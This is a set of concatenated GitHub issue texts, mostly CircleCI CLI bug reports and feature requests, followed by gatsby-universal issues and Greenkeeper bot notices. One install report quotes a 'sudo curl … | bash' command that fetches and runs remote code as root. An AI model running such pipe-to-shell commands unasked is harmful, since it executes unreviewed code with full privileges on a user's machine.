# [#] required key [version] not found
vesion: 2
jobs:
  build:
    macos:
      xcode: 11.0.0
    steps:
    - checkout
    - run:
        name: Build and run tests
        command: fastlane scan
        environment:
          SCAN_DEVICE: iPhone Xʀ (13.0)
          SCAN_SCHEME: test_iOS_NoSwiftUI
    - store_test_results:
        path: test_output/report.xml
    - store_artifacts:
        path: /tmp/test-results
        destination: scan-test-results
    - store_artifacts:
        path: ~/Library/Logs/scan
        destination: scan-logs
workflows:
  version: 2
  workflow:
    jobs:
    - build
```

**It seems like the `circleci config validate` command should emit these same warnings.**

----

More importantly though, a config file which will cause a build failure _also_ passes `circleci config validate` :-/

If you put fewer spaces in your indentation for the `- run` entry like this:

```
version: 2
jobs:
..build: 
....macos:
......xcode: "11.0.0"
....
....steps:
......- checkout
....
......- run:
........name: Build and run tests
........command: fastlane scan
........environment:
..........SCAN_DEVICE: iPhone Xʀ (13.0)
..........SCAN_SCHEME: test_iOS_NoSwiftUI
........
......- store_test_results:
........path: test_output/report.xml
..........
......- store_artifacts:
........path: /tmp/test-results
........destination: scan-test-results
..........
......- store_artifacts:
........path: ~/Library/Logs/scan
........destination: scan-logs
```

it again passes validation:

```
tyler$ circleci config validate
Config file at .circleci/config.yml is valid.
```

but the build will fail with a ton of issues in the output:

```
# -------- WARNING ---------
# Your config does not conform to the schema.
# Violations are listed below:
# 
# ERROR IN CONFIG FILE:
# [#/jobs/build] only 1 subschema matches out of 2
# 1. [#/jobs/build/steps] 21 schema violations found
# |   1. [#/jobs/build/steps/1] 0 subschemas matched instead of one
# |   |   1. [#/jobs/build/steps/1] 6 schema violations found
# |   |   |   1. [#/jobs/build/steps/1] extraneous key [command] is not permitted
# |   |   |   |   Permitted keys:
# |   |   |   |     - persist_to_workspace
# |   |   |   |     - save_cache
# |   |   |   |     - run
# |   |   |   |     - checkout
# |   |   |   |     - attach_workspace
# |   |   |   |     - store_test_results
# |   |   |   |     - restore_cache
# |   |   |   |     - store_artifacts
# |   |   |   |     - add_ssh_keys
# |   |   |   |     - deploy
# |   |   |   |     - setup_remote_docker
# |   |   |   |   Passed keys:
# |   |   |   |     - run
# |   |   |   |     - name
# |   |   |   |     - command
# |   |   |   |     - environment
# |   |   |   2. [#/jobs/build/steps/1] extraneous key [environment] is not permitted
# |   |   |   |   Permitted keys:
# |   |   |   |     - persist_to_workspace
# |   |   |   |     - save_cache
# |   |   |   |     - run
# |   |   |   |     - checkout
# |   |   |   |     - attach_workspace
# |   |   |   |     - store_test_results
# |   |   |   |     - restore_cache
# |   |   |   |     - store_artifacts
# |   |   |   |     - add_ssh_keys
# |   |   |   |     - deploy
# |   |   |   |     - setup_remote_docker
# |   |   |   |   Passed keys:
# |   |   |   |     - run
# |   |   |   |     - name
# |   |   |   |     - command
# |   |   |   |     - environment
# |   |   |   3. [#/jobs/build/steps/1] extraneous key [name] is not permitted
# |   |   |   |   Permitted keys:
# |   |   |   |     - persist_to_workspace
# |   |   |   |     - save_cache
# |   |   |   |     - run
# |   |   |   |     - checkout
# |   |   |   |     - attach_workspace
# |   |   |   |     - store_test_results
# |   |   |   |     - restore_cache
# |   |   |   |     - store_artifacts
# |   |   |   |     - add_ssh_keys
# |   |   |   |     - deploy
# |   |   |   |     - setup_remote_docker
# |   |   |   |   Passed keys:
# |   |   |   |     - run
# |   |   |   |     - name
# |   |   |   |     - command
# |   |   |   |     - environment
# |   |   |   4. [#/jobs/build/steps/1] maximum size: [1], found: [4]
# |   |   |   |   SCHEMA:
# |   |   |   |     maxProperties: 1
# |   |   |   |   INPUT:
# |   |   |   |     run: {}
# |   |   |   |     name: Build and run tests
# |   |   |   |     command: fastlane scan
# |   |   |   |     environment:
# |   |   |   |       SCAN_DEVICE: iPhone X\u0280 (13.0)
# |   |   |   |       SCAN_SCHEME: test_iOS_NoSwiftUI
# |   |   |   5. [#/jobs/build/steps/1/run] 0 subschemas matched instead of one
# |   |   |   |   1. [#/jobs/build/steps/1/run] expected type: String, found: Mapping
# |   |   |   |   |   {run \"...\"} is shorthand for `{run {command \"...\"}}`
# |   |   |   |   |   SCHEMA:
# |   |   |   |   |     type: string
# |   |   |   |   |   INPUT:
# |   |   |   |   |     null
# |   |   |   |   2. [#/jobs/build/steps/1/run] required key [command] not found
# |   |   2. [#/jobs/build/steps/1] Input not a valid enum value
# |   |   |   Steps without arguments can be called as strings
# |   |   |     enum:
# |   |   |     - checkout
# |   |   |     - setup_remote_docker
# |   |   |     - add_ssh_keys
# |   2. [#/jobs/build/steps/2] 0 subschemas matched instead of one
# |   |   1. [#/jobs/build/steps/2] 3 schema violations found
# |   |   |   1. [#/jobs/build/steps/2] extraneous key [path] is not permitted
# |   |   |   |   Permitted keys:
# |   |   |   |     - persist_to_workspace
# |   |   |   |     - save_cache
# |   |   |   |     - run
# |   |   |   |     - checkout
# |   |   |   |     - attach_workspace
# |   |   |   |     - store_test_results
# |   |   |   |     - restore_cache
# |   |   |   |     - store_artifacts
# |   |   |   |     - add_ssh_keys
# |   |   |   |     - deploy
# |   |   |   |     - setup_remote_docker
# |   |   |   |   Passed keys:
# |   |   |   |     - store_test_results
# |   |   |   |     - path
# |   |   |   2. [#/jobs/build/steps/2] maximum size: [1], found: [2]
# |   |   |   |   SCHEMA:
# |   |   |   |     maxProperties: 1
# |   |   |   |   INPUT:
# |   |   |   |     store_test_results: {}
# |   |   |   |     path: test_output/report.xml
# |   |   |   3. [#/jobs/build/steps/2/store_test_results] required key [path] not found
# |   |   2. [#/jobs/build/steps/2] Input not a valid enum value
# |   |   |   Steps without arguments can be called as strings
# |   |   |     enum:
# |   |   |     - checkout
# |   |   |     - setup_remote_docker
# |   |   |     - add_ssh_keys
# |   3. [#/jobs/build/steps/3] 0 subschemas matched instead of one
# |   |   1. [#/jobs/build/steps/3] 4 schema violations found
# |   |   |   1. [#/jobs/build/steps/3] extraneous key [destination] is not permitted
# |   |   |   |   Permitted keys:
# |   |   |   |     - persist_to_workspace
# |   |   |   |     - save_cache
# |   |   |   |     - run
# |   |   |   |     - checkout
# |   |   |   |     - attach_workspace
# |   |   |   |     - store_test_results
# |   |   |   |     - restore_cache
# |   |   |   |     - store_artifacts
# |   |   |   |     - add_ssh_keys
# |   |   |   |     - deploy
# |   |   |   |     - setup_remote_docker
# |   |   |   |   Passed keys:
# |   |   |   |     - store_artifacts
# |   |   |   |     - path
# |   |   |   |     - destination
# |   |   |   2. [#/jobs/build/steps/3] extraneous key [path] is not permitted
# |   |   |   |   Permitted keys:
# |   |   |   |     - persist_to_workspace
# |   |   |   |     - save_cache
# |   |   |   |     - run
# |   |   |   |     - checkout
# |   |   |   |     - attach_workspace
# |   |   |   |     - store_test_results
# |   |   |   |     - restore_cache
# |   |   |   |     - store_artifacts
# |   |   |   |     - add_ssh_keys
# |   |   |   |     - deploy
# |   |   |   |     - setup_remote_docker
# |   |   |   |   Passed keys:
# |   |   |   |     - store_artifacts
# |   |   |   |     - path
# |   |   |   |     - destination
# |   |   |   3. [#/jobs/build/steps/3] maximum size: [1], found: [3]
# |   |   |   |   SCHEMA:
# |   |   |   |     maxProperties: 1
# |   |   |   |   INPUT:
# |   |   |   |     store_artifacts: {}
# |   |   |   |     path: /tmp/test-results
# |   |   |   |     destination: scan-test-results
# |   |   |   4. [#/jobs/build/steps/3/store_artifacts] required key [path] not found
# |   |   2. [#/jobs/build/steps/3] Input not a valid enum value
# |   |   |   Steps without arguments can be called as strings
# |   |   |     enum:
# |   |   |     - checkout
# |   |   |     - setup_remote_docker
# |   |   |     - add_ssh_keys
# |   4. [#/jobs/build/steps/4] 0 subschemas matched instead of one
# |   |   1. [#/jobs/build/steps/4] 4 schema violations found
# |   |   |   1. [#/jobs/build/steps/4] extraneous key [destination] is not permitted
# |   |   |   |   Permitted keys:
# |   |   |   |     - persist_to_workspace
# |   |   |   |     - save_cache
# |   |   |   |     - run
# |   |   |   |     - checkout
# |   |   |   |     - attach_workspace
# |   |   |   |     - store_test_results
# |   |   |   |     - restore_cache
# |   |   |   |     - store_artifacts
# |   |   |   |     - add_ssh_keys
# |   |   |   |     - deploy
# |   |   |   |     - setup_remote_docker
# |   |   |   |   Passed keys:
# |   |   |   |     - store_artifacts
# |   |   |   |     - path
# |   |   |   |     - destination
# |   |   |   2. [#/jobs/build/steps/4] extraneous key [path] is not permitted
# |   |   |   |   Permitted keys:
# |   |   |   |     - persist_to_workspace
# |   |   |   |     - save_cache
# |   |   |   |     - run
# |   |   |   |     - checkout
# |   |   |   |     - attach_workspace
# |   |   |   |     - store_test_results
# |   |   |   |     - restore_cache
# |   |   |   |     - store_artifacts
# |   |   |   |     - add_ssh_keys
# |   |   |   |     - deploy
# |   |   |   |     - setup_remote_docker
# |   |   |   |   Passed keys:
# |   |   |   |     - store_artifacts
# |   |   |   |     - path
# |   |   |   |     - destination
# |   |   |   3. [#/jobs/build/steps/4] maximum size: [1], found: [3]
# |   |   |   |   SCHEMA:
# |   |   |   |     maxProperties: 1
# |   |   |   |   INPUT:
# |   |   |   |     store_artifacts: {}
# |   |   |   |     path: ~/Library/Logs/scan
# |   |   |   |     destination: scan-logs
# |   |   |   4. [#/jobs/build/steps/4/store_artifacts] required key [path] not found
# |   |   2. [#/jobs/build/steps/4] Input not a valid enum value
# |   |   |   Steps without arguments can be called as strings
# |   |   |     enum:
# |   |   |     - checkout
# |   |   |     - setup_remote_docker
# |   |   |     - add_ssh_keys
version: 2
jobs:
  build:
    macos:
      xcode: 11.0.0
    steps:
    - checkout
    - run: {}
      name: Build and run tests
      command: fastlane scan
      environment:
        SCAN_DEVICE: iPhone Xʀ (13.0)
        SCAN_SCHEME: test_iOS_NoSwiftUI
    - store_test_results: {}
      path: test_output/report.xml
    - store_artifacts: {}
      path: /tmp/test-results
      destination: scan-test-results
    - store_artifacts: {}
      path: ~/Library/Logs/scan
      destination: scan-logs
workflows:
  version: 2
  workflow:
    jobs:
    - build
```

**Configuration files which cause the build system to fail like this don't seem like they should bass a `circleci config validate`**

It also seems like the indentation after a `- run:` of two spaces -- like it is everywhere else -- would be a reasonable and more consistent requirement rather than the 4 spaces it seems to be requiring now (?).

----

Checked the version of the circleci CLI I installed via homebrew:

```
tyler$ circleci version
0.1.5810+ac0d85f
```
and does appear that Homebrew doesn't is behind by a minor version. *However*, the only commits between that version (1.5810) and the current version (1.5830) is a contributor added to CONTRIBUTORS.md and the merge of that PR).

Checked the diagnostics to make sure `circleci` cli was working properly:

```
tyler$ circleci diagnostic
---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /Users/tyler/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API... 
Ok.
Hello, Tyler.
```

and it appears to be.
 - [x] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x] I have checked for similar issues and haven't found anything relevant.
- [x] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**

This is a feature request. Would it be possible to add a simple check that could be a nice time saver in the `config validate` command: ensure any cache key given `save_cache` command appears at least once in a `restore_cache` and vice versa. I could also be a nice cash (as in money) saver for you guys.

**What is the current behavior?**

Cache keys are not checked.

Can you provide an example?

Any `.circleci/config.yml` that contains something like
```yaml
- restore_cache:
    key: package-cache-{{ checksum "requirements.txt" }}-v1
- save_cache:
    key: packages-cache-{{ checksum "requirements.txt" }}-v1  # notice the added 's' to package
    path:
    - some/path
```
Should raise a warning or an error.

**What is the expected behavior?**

Assume the above file is being validated: 
```shell
$ circleci config vadilate
Config file at .circleci/config is not valid.
Cache "package-cache-{{ checksum "requirements.txt }}-v1" is restored but never saved.
Cache "packages-cache-{{ checksum "requirements.txt }}-v1" is saved but never restored.
$ echo $?  # Non zero value
```
**Which version of the CLI and OS are you using? Did this work in previous versions?**

```
$ circleci version
0.1.5879+416032d
```
On an Ubuntu linux machine.
```
$ circleci diagnostic
---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /home/nicolas/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API... 
Ok.
Hello, Nicolas C.```

 - [X] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [X] I have checked for similar issues and haven't found anything relevant.
- [X] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
Report a bug / ask a question

**What is the current behavior?**
Running `make test` locally fails 4 test cases in `/cmd/update_test.go`.

**Can you provide an example?**
All four test cases are failing with the same error: rather than getting "You are running 0.0.0-dev" I get the message "No updates found."

```
------------------------------
• Failure [0.049 seconds]
Update
/Users/mvxt_cci/workspace/circleci-cli/cmd/update_test.go:17
  update --check
  /Users/mvxt_cci/workspace/circleci-cli/cmd/update_test.go:59
    with flag should tell the user how to update and install [It]
    /Users/mvxt_cci/workspace/circleci-cli/cmd/update_test.go:67

    No future change is possible.  Bailing out early after 0.046s.
    Got stuck at:
        No updates found.

    Waiting for:
        You are running 0.0.0-dev

    /Users/mvxt_cci/workspace/circleci-cli/cmd/update_test.go:73
------------------------------
```

**What is the expected behavior?**
Should say "You are running 0.0.0-dev" but it says there are no more updates.

**Which version of the CLI and OS are you using? Did this work in previous versions?**
Occurs on latest `master` commit. Using macOS Mojave 10.14.5. Not sure if this worked in previous version because I've only cloned this repo within the last week or two.

Please provide the output of `circleci version` and `circleci diagnostic`.
The following output is after compiling the executable and running that rather than installing from package manager like brew.
```
[13:21:03] mvxt_cci:circleci-cli git:(master*) $ ./circleci-cli version
0.0.0-dev
[13:21:04] mvxt_cci:circleci-cli git:(master*) $ ./circleci-cli diagnostic
You are running 0.0.0-dev
A new release is available (0.1.5725)
You can visit the Github releases page for the CLI to manually download and install:
https://github.com/CircleCI-Public/circleci-cli/releases


---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /Users/mvxt_cci/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API...
Ok.
Hello, Michael Thanh.
[13:21:09] mvxt_cci:circleci-cli git:(master*) $
```

So it looks like if I run the compiled executable, the "version" is correct and prints out the correct message. But for some reason the test fails. I'm still fairly new to Go and don't know how to debug this yet - [x ] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x ] I have checked for similar issues and haven't found anything relevant.
- [x ] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
Bug

**What is the current behavior?**
Cannot install circleci on ubuntu using curl command. Prefer not to install items with snap. Everything I have installed with snap crashes my Ubuntu

Can you provide an example?
both provied curl commands fail
```
sudo curl -fLSs https://circle.ci/cli | bash
sudo curl -fLSs https://circle.ci/cli | DESTDIR=/opt/bin bash
```

**What is the expected behavior?**
install and work

**Which version of the CLI and OS are you using? Did this work in previous versions?**
Ubuntu 18.04.2 LTS x86_64
Kernel: 4.18.0-17-generic
shell: bash 4.4.19
DE: GNOME 3.28.3
WM: GNOME Shell
Terminal: gnome-terminal


Please provide the output of `circleci version` and `circleci diagnostic`.

With `sudo curl -fLSs https://circle.ci/cli | bash`
```
Starting installation.
Installing CircleCI CLI v0.1.5490
Installing to /usr/local/bin
mv: cannot move 'circleci' to '/usr/local/bin/circleci': Permission denied
An error occured installing the tool.
The contents of the directory /tmp/tmp.Hy1GTtpEgu have been left in place to help to debug the issue.
```
With `sudo curl -fLSs https://circle.ci/cli | DESTDIR=/opt/bin bash`
```
Starting installation.
Installing CircleCI CLI v0.1.5490
Installing to /opt/bin
mv: cannot move 'circleci' to '/opt/bin': Permission denied
An error occured installing the tool.
The contents of the directory /tmp/tmp.6WX9FCJY8J have been left in place to help to debug the issue
```

I am able to cd to `/tmp/tmp.6WX9FCJY8J` and execute `./circleci` and that works. But it says it fails, and is not installed to my bash profile?

 - [x ] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x ] I have checked for similar issues and haven't found anything relevant.
- [x ] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**

At first I thought "bug", but perhaps this is really a feature request.

**What is the current behavior?**

CLI considers config version `2.1` to be an invalid version. Try `circleci local execute --job somejob` for a `config.yml` file that has `version: 2.1` at the top. You will see the following output:

```
Error:
You attempted to run a local build with version '2.1' of configuration.
Local builds do not support that version at this time.
```

**What is the expected behavior?**

If I use a locally-built CLI with `build.go` changed to consider `2.1` a valid version string, the CLI accepts the config and attempts the requested operation (`local execute`, in my case).

**Which version of the CLI and OS are you using? Did this work in previous versions?**

0.1.5879+416032d
MacOS 10.14.6 (Mojave)
didn't try with previous versions (first installation of tool)

Please provide the output of `circleci version` and `circleci diagnostic`.

```
±  |master U:3 ?:1 ✗| → circleci diagnostic

---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /Users/avvir/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API...
Ok.
Hello, Robin.

±  |master U:3 ?:1 ✗| → circleci version
0.1.5879+416032d
```

**If you have any questions, feel free to ping us at @CircleCI-Public/x-team.**
 - [ ] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [ ] I have checked for similar issues and haven't found anything relevant.
- [ ] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
BUG

**What is the current behavior?**
robeferre@mylinux:~/Workspace/golang/src/github.com/robeferre-leroy/golang-sample$ sudo circleci local execute
Docker image digest: sha256:60a98b5fc00a4302c46be2217d6e4e4eb8491d466fa62fed14362a85100bcd68
====>> Spin up Environment
Build-agent version 1.0.15283-35354d0e (2019-09-09T12:09:35+0000)
Docker Engine Version: 18.09.7
Kernel Version: Linux 6772389d44a6 5.0.0-27-generic #28~18.04.1-Ubuntu SMP Thu Aug 22 03:00:32 UTC 2019 x86_64 Linux
Starting container circleci/buildpack-deps:latest-dind
  using image circleci/buildpack-deps@sha256:f9dea38e6583c663bbe2d950b8c9abdb771f9dd587fdb18460da2f4253c3a70a

Using build environment variables
  BASH_ENV=/tmp/.bash_env-localbuild-1568756269
  CI=true
  CIRCLECI=true
  CIRCLE_BRANCH=feature/circleci
  CIRCLE_BUILD_NUM=
  CIRCLE_JOB=build
  CIRCLE_NODE_INDEX=0
  CIRCLE_NODE_TOTAL=1
  CIRCLE_REPOSITORY_URL=https://github.com/robeferre-leroy/golang-sample.git
  CIRCLE_SHA1=0660ce60a8c0e3a4de9e571566ce6646a81a426a
  CIRCLE_SHELL_ENV=/tmp/.bash_env-localbuild-1568756269
  CIRCLE_WORKING_DIRECTORY=~/project

====>> Checkout code
  #!/bin/bash -eo pipefail
mkdir -p /home/circleci/project && cd /tmp/_circleci_local_build_repo && git ls-files | tar -T - -c | tar -x -C /home/circleci/project && cp -a /tmp/_circleci_local_build_repo/.git /home/circleci/project
{"Runner":true,"level":"error","msg":"Error copying logs: read /dev/ptmx: input/output error","task-id":"localbuild-1568756269","time":"2019-09-17T21:37:54Z"}
/bin/bash: line 0: cd: /tmp/_circleci_local_build_repo: No such file or directory
Error: Exited with code 1
Step failed
Error: runner failed (exited with 101)
Task failed

Can you provide an example?
robeferre@mylinux:~/Workspace/golang/src/github.com/robeferre-leroy/golang-sample$ sudo circleci local execute
Docker image digest: sha256:60a98b5fc00a4302c46be2217d6e4e4eb8491d466fa62fed14362a85100bcd68
====>> Spin up Environment
Build-agent version 1.0.15283-35354d0e (2019-09-09T12:09:35+0000)
Docker Engine Version: 18.09.7
Kernel Version: Linux 6772389d44a6 5.0.0-27-generic #28~18.04.1-Ubuntu SMP Thu Aug 22 03:00:32 UTC 2019 x86_64 Linux
Starting container circleci/buildpack-deps:latest-dind
  using image circleci/buildpack-deps@sha256:f9dea38e6583c663bbe2d950b8c9abdb771f9dd587fdb18460da2f4253c3a70a

Using build environment variables
  BASH_ENV=/tmp/.bash_env-localbuild-1568756269
  CI=true
  CIRCLECI=true
  CIRCLE_BRANCH=feature/circleci
  CIRCLE_BUILD_NUM=
  CIRCLE_JOB=build
  CIRCLE_NODE_INDEX=0
  CIRCLE_NODE_TOTAL=1
  CIRCLE_REPOSITORY_URL=https://github.com/robeferre-leroy/golang-sample.git
  CIRCLE_SHA1=0660ce60a8c0e3a4de9e571566ce6646a81a426a
  CIRCLE_SHELL_ENV=/tmp/.bash_env-localbuild-1568756269
  CIRCLE_WORKING_DIRECTORY=~/project

====>> Checkout code
  #!/bin/bash -eo pipefail
mkdir -p /home/circleci/project && cd /tmp/_circleci_local_build_repo && git ls-files | tar -T - -c | tar -x -C /home/circleci/project && cp -a /tmp/_circleci_local_build_repo/.git /home/circleci/project
{"Runner":true,"level":"error","msg":"Error copying logs: read /dev/ptmx: input/output error","task-id":"localbuild-1568756269","time":"2019-09-17T21:37:54Z"}
/bin/bash: line 0: cd: /tmp/_circleci_local_build_repo: No such file or directory
Error: Exited with code 1
Step failed
Error: runner failed (exited with 101)
Task failed

**What is the expected behavior?**
testing builds locally

**Which version of the CLI and OS are you using? Did this work in previous versions?**
circleci version
0.1.5879+416032d

NAME="Ubuntu"
VERSION="18.04.3 LTS (Bionic Beaver)"

Please provide the output of `circleci version` and `circleci diagnostic`.
---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /home/robeferre/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API... 
Ok.
Hello, Roberto.

**If you have any questions, feel free to ping us at @CircleCI-Public/x-team.**
 Our [coverage][1] job occasionally [fails][2] due to network timeout.

We should add a retry or something to this job to reduce the chances the job will fail causing a developer to manually re-run the workflow.

[1]: https://github.com/CircleCI-Public/circleci-cli/blob/ac0d85fe5e85c0e49441c3803944614877f9ab77/.circleci/config.yml#L81
[2]: https://app.circleci.com/jobs/github/CircleCI-Public/circleci-cli/5798 - [x] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x] I have checked for similar issues and haven't found anything relevant. (none of the other missing config solutions worked for me)
- [x] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**

BUG

**What is the current behavior?**

Unable to locally execute circle ci for testing my builds.

Can you provide an example?

```
git clone https://github.com/CircleCI-Public/circleci-demo-go.git
cd circleci-demo-go
circleci local execute --job build
```

Result

```
Docker image digest: sha256:463f8b03fa34e7609792bbc3e8983167fbb1221d9cefb1be401c0952973b3ebb
Error: failed to start event processor: failed to compute task config: failed to read config file: open circle.yml: no such file or directory
```

Config is valid

```
~/circleci-demo-go$ circleci config validate
Config file at .circleci/config.yml is valid.
```

Both docker and circleci are running within my user space without the need of sudo.

**What is the expected behavior?**

When I run the example code from "https://circleci.com/docs/2.0/local-cli/" I expect the config file to be found and that it runs the job.

**Which version of the CLI and OS are you using? Did this work in previous versions?**

Never used a previous version.

- Windows 10 Pro 1903, build 18363.264
- WSL: Linux MSI 4.4.0-18362-Microsoft #1-Microsoft Mon Mar 18 12:02:00 PST 2019 x86_64 x86_64 x86_64 GNU/Linux
- Ubuntu 18.04
- 32g ram, 64bit, core i7-8750h
- Docker version 18.09.6, build 481bc77

Please provide the output of `circleci version` and `circleci diagnostic`.

`0.1.5725+b0a23c0`

and

```
---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /home/wemeet/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
OK, got a token.
Trying an introspection query on API...
Ok.
Hello, Kelvin.
```

Related to: #290
 relates to https://github.com/CircleCI-Public/circleci-cli/issues/256
Also relates to https://github.com/Homebrew/homebrew-core/pull/39797/

Basically, I am not quite sure how to introduce `packr` process into the formula testing.

Might need some eyes and help on this. - [X] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [X] I have checked for similar issues and haven't found anything relevant.
- [X] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**

feature

**What is the current behavior?**

the picard container always copies the project dir before executing the build.

Can you provide an example?

**What is the expected behavior?**

I would like it if you could turn that behavior off so the build can affect the original working directory on the host machine.

**Which version of the CLI and OS are you using? Did this work in previous versions?**

0.1.5830+2bb45a0

OSX 10.14.5 (18F203)


---
CircleCI CLI Diagnostics
---
Debugger mode: false
Config found: /Users/johnmcgowan/.circleci/cli.yml
API host: https://circleci.com
API endpoint: graphql-unstable
Error: please set a token with 'circleci setup'
You can create a new personal API token here:
https://circleci.com/account/api

**If you have any questions, feel free to ping us at @CircleCI-Public/x-team.**
 - [x] I have read [Contribution Guidelines](https://github.com/CircleCI-Public/circleci-cli/blob/master/CONTRIBUTING.md).
- [x] I have checked for similar issues and haven't found anything relevant.
- [x] This is not a security issue (which should be reported here: https://circleci.com/security/)

**Do you want to request a *feature* or report a *bug*?**
Feature

**What is the current behavior?**
I am able to validate a config file piped in to the process stdin using `-` as config path, but not when trying to run a build.

Here is an example:
```console
$ circleci config process .circleci/config.yml | circleci config validate -c -
Config input is valid.
$ circleci config process .circleci/config.yml | circleci build -c -
Error: Unable to read config file: open -: no such file or directory
```
**What is the expected behavior?**
The `circleci build` config param `-c` set to `-` is interpreted as *read config from stdin*. Meaning I am able to run a build when piping in a config file to the process stdin using `-` as config path.
```console
$ circleci config process .circleci/config.yml | circleci build -c -
<build starts and output from it follows>
```
<---------->
138096617
With a new project,

```
 gatsby new my-site https://github.com/fabe/gatsby-universal
```

I do `gatsby build` and `gatsby serve` 

the html that is generated references eg `icons/apple-touch-icon-57x57.png` etc... but those files don't seem to exist. I can't find a subfolder `icons` in `public` at all.  What am I doing wrong? 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-image](https://www.npmjs.com/package/gatsby-image) was updated from `2.0.38` to `2.0.39`.
- The `dependency` [gatsby-plugin-react-helmet](https://www.npmjs.com/package/gatsby-plugin-react-helmet) was updated from `3.0.11` to `3.0.12`.
- The `dependency` [gatsby-plugin-sharp](https://www.npmjs.com/package/gatsby-plugin-sharp) was updated from `2.0.34` to `2.0.35`.
- The `dependency` [gatsby-plugin-sitemap](https://www.npmjs.com/package/gatsby-plugin-sitemap) was updated from `2.0.11` to `2.0.12`.
- The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.29` to `2.0.30`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.8` to `2.3.9`.
- The `dependency` [gatsby-transformer-sharp](https://www.npmjs.com/package/gatsby-transformer-sharp) was updated from `2.1.17` to `2.1.18`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.3.25` to `2.3.26`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190423124108).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


gatsby is a direct dependency of this project, and **it is very likely causing it to break**. If other packages depend on yours, this update is probably also breaking those in turn.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/fabe/gatsby-universal/777?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 I've been struggling with [an issue](https://github.com/jeremyckahn/shifty/issues/112) with the [shifty](https://github.com/jeremyckahn/shifty/) library, which with the help of shifty's owner I've hunted down to the default config of `directory-named-webpack-plugin` affecting modules within `node_modules`, which I think it's safe to assume should handle their own resolution regarding what files to consider their primary entry points.

Adding `exclude: /node_modules/` to the config fixes the issue I was having with `shifty`, and seems to me to be a pretty sensible default, so I've made a pull request with the change. 🚨 You need to enable Continuous Integration on Greenkeeper branches of this repository. 🚨

To enable Greenkeeper, you need to make sure that a [commit status](https://help.github.com/articles/about-statuses/) is reported on all branches. This is required by Greenkeeper because it uses your CI build statuses to figure out when to notify you about breaking changes.

Since we didn’t receive a CI status on the [`greenkeeper/initial`](https://github.com/fabe/gatsby-universal/commits/greenkeeper/initial) branch, it’s possible that you don’t have CI set up yet. We recommend using [Travis CI](https://travis-ci.org), but Greenkeeper will work with every other CI service as well.

If you _have_ already set up a CI for this repository, you might need to check how it’s configured. Make sure it is set to run on all new branches. If you don’t want it to run on absolutely every branch, you can whitelist branches starting with `greenkeeper/`.

Once you have installed and configured CI on this repository correctly, you’ll need to re-trigger Greenkeeper’s initial pull request. To do this, please click the 'fix repo' button on [account.greenkeeper.io](https://account.greenkeeper.io).
 
## There have been updates to the *gatsby* monorepo:

 + - The `dependency` [gatsby-source-filesystem](https://www.npmjs.com/package/gatsby-source-filesystem) was updated from `2.0.27` to `2.0.28`.
- The `dependency` [gatsby-transformer-remark](https://www.npmjs.com/package/gatsby-transformer-remark) was updated from `2.3.7` to `2.3.8`.
- The `dependency` [gatsby](https://github.com/gatsbyjs/gatsby) was updated from `2.2.8` to `2.2.9`.


🚨 [View failing branch](https://github.com/fabe/gatsby-universal/compare/master...fabe:greenkeeper%2Fmonorepo.gatsby-20190323202510).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [gatsby group definition](https://github.com/greenkeeperio/monorepo-definitions).


